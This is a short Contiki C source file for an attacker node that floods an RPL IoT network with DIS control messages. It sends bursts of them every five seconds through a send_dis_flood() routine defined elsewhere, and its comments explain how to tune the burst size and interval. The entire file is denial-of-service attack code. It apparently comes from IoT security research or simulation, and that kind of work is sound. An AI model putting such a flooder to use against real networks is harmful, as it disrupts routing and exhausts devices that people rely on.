/*
 * This file is a wrapper to initialize and run an external attacker node that performs
 * a DIS flooding attack. This node does NOT join the RPL network or participate in any RPL operations.
 */

#include "contiki.h"
#include "rpl-icmp6.h"

PROCESS(dis_flood_process, "DIS Flood Process");
AUTOSTART_PROCESSES(&dis_flood_process);

/* Define a timer for DIS flooding */
static struct etimer dis_flood_timer;

/* Number of DIS messages to send in each burst */
#define DIS_BURST_COUNT 3 // change this to control how many DIS messages to send in each burst

PROCESS_THREAD(dis_flood_process, ev, data)
{
  PROCESS_BEGIN();

  /* Initialize the DIS flooding timer - send bursts every 5 seconds */
  etimer_set(&dis_flood_timer, CLOCK_SECOND * 5); // change the second argument to control the interval between bursts

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(ev == PROCESS_EVENT_TIMER);
    
    /* Send multiple DIS messages in a burst */
    for(int i = 0; i < DIS_BURST_COUNT; i++) {
      send_dis_flood();
    }
    
    /* Reset timer for next burst */
    etimer_reset(&dis_flood_timer);
  }

  PROCESS_END();
}

